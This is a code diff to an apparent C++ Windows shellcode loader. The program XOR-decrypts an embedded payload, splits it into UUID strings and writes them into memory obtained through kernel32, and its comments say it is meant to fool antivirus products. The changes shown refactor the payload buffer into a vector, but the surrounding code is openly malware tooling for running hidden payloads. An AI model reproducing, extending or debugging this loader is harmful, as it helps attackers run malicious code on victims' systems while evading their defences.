@@ -6,6 +6,8 @@
 #include <cstring>
 #include <iostream>
 #include <rpc.h>
+#include <vector>
+using std::vector;
 
 // set your xor key( it should be similar to the one you used in the "xor_encryptor.py" )
 #define XOR_KEY "CHANGEME"
@@ -176,10 +178,10 @@ int main(int argc, char *argv[])
 #endif
 
                 // a NULL terminator can cause very SERIOUS bugs so 1st remove it from the key
-                XOR(payload, sizeof(payload), key, (sizeof(key) - 1));
+                XOR(payload.data(), payload.size(), key, (sizeof(key) - 1));
 
 #if DEBUG
-                printf("After xor: %s\n\n", payload);
+                printf("After xor: %s\n\n", payload.data());
 #endif
 
                 HMODULE k32_handle{GetModuleHandle(k32DllName)};
@@ -193,7 +195,7 @@ int main(int argc, char *argv[])
                 DWORD_PTR hptr = reinterpret_cast<DWORD_PTR>(mem);
 
                 int i{}; // fool some AVs. maybe give them a detour :)
-                for (temp = strtok((char *)payload, "\n"); temp;)
+                for (temp = strtok((char *)payload.data(), "\n"); temp;)
                 {
                         strncpy(chars_array, temp, UUID_LINE_LEN);
                         chars_array[UUID_LINE_LEN - 1] = 0x0; // the NULL byte :)
